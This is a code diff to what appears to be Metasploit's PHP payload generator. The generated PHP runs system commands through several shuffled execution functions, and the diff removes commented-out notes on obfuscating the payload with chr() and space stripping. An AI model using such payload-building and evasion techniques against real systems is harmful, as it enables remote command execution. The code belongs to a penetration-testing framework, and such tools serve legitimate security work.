@@ -69,7 +69,7 @@ module Msf::Payload::Php
     in_array    = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
 
     setup = "
-      if (FALSE !== stristr(PHP_OS, 'win' )) {
+      if (FALSE!==stristr(PHP_OS,'win')){
         #{cmd}=#{cmd}.\" 2>&1\\n\";
       }
       #{is_callable}='is_callable';
@@ -134,45 +134,9 @@ module Msf::Payload::Php
       }
     "
 
-    exec_methods = [passthru, shell_exec, system, exec, proc_open, popen].sort_by { rand }
+    exec_methods = [passthru, shell_exec, system, exec, proc_open, popen]
+    exec_methods = exec_methods.shuffle
     buf = setup + exec_methods.join("") + fail_block
-    #buf = Rex::Text.compress(buf)
-
-    ###
-    # All of this junk should go in an encoder
-    #
-    # Replace all single-quoted strings with quoteless equivalents, e.g.:
-    #    echo('asdf');
-    # becomes
-    #    echo($a.$s.$d.$f);
-    # and add "$a=chr(97);" et al to the top of the block
-    #
-    # Once this is complete, it is guaranteed that there are no spaces
-    # inside strings.  This combined with the fact that there are no
-    # function definitions, which require a space between the "function"
-    # keyword and the name, means we can completely remove spaces.
-    #
-    #alpha_used = { 95 }
-    #buf.gsub!(/'(.*?)'/) {
-    #	str_array = []
-    #	$1.each_byte { |c|
-    #		if (('a'..'z').include?(c.chr))
-    #			alpha_used[c] = 1
-    #			str_array << "$#{c.chr}."
-    #		else
-    #			str_array << "chr(#{c})."
-    #		end
-    #	}
-    #	str_array.last.chop!
-    #	str_array.join("")
-    #}
-    #if (alpha_used.length > 1)
-    #	alpha_used.each_key { |k| buf = "$#{k.chr}=chr(#{k});" + buf }
-    #end
-    #
-    #buf.gsub!(/\s*/, '')
-    #
-    ###
 
     return buf
 
